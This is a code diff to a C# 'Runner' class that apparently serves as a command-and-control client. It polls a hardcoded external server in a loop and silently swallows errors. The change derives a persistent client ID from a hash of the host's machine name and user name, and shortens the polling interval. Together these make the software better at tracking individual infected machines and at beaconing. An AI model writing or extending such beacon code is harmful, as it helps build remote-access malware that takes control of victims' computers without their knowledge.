@@ -11,8 +11,29 @@ public class Runner
     public static void Start(string args)
     {
         string serverUrl = "https://soulinkkk1.pythonanywhere.com";
-        string clientId = Guid.NewGuid().ToString().Substring(0, 8);
+
+        // Create a stable ID by combining hardware/user traits and taking a short hash
+        string deterministicSeed = Environment.MachineName + "-" + Environment.UserName;
+        string clientId = GetMyStableHash(deterministicSeed).Substring(0, 8);
+
         MainLoop(serverUrl, clientId);
+    }
+
+    // Helper method to generate a consistent hash string
+    private static string GetMyStableHash(string input)
+    {
+        using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
+        {
+            byte[] inputBytes = Encoding.UTF8.GetBytes(input);
+            byte[] hashBytes = md5.ComputeHash(inputBytes);
+
+            StringBuilder sb = new StringBuilder();
+            for (int i = 0; i < hashBytes.Length; i++)
+            {
+                sb.Append(hashBytes[i].ToString("x2"));
+            }
+            return sb.ToString();
+        }
     }
 
     private static void MainLoop(string serverUrl, string clientId)
@@ -51,7 +72,7 @@ public class Runner
                 }
             }
             catch { }
-            Delay(3000);
+            Delay(2000);
         }
     }
 
